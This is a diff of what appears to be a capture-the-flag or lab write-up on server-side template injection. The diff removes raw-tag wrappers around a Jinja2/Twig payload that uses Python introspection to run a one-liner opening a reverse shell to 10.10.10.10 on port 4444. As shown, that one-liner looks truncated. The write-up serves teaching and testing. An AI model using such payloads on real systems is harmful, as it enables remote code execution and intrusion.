@@ -35,9 +35,9 @@ The 49 present indicates that it worked, and that the other payload was not proc
 From here, based on the flowchart, the website is running on either Jinja2 or Twig. A payload from PayloadAllTheThings can then be used:
 
 ```python
-{% raw %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);").read().zfill(417)}}{%endif%}{% endfor %}
-{% endraw %}
+
+
 ```
 
 Editing the payload with the correct IP and port number gave me a reverse shell. SSTI is rather easy to exploit once found. Here are some other payloads used for testing:
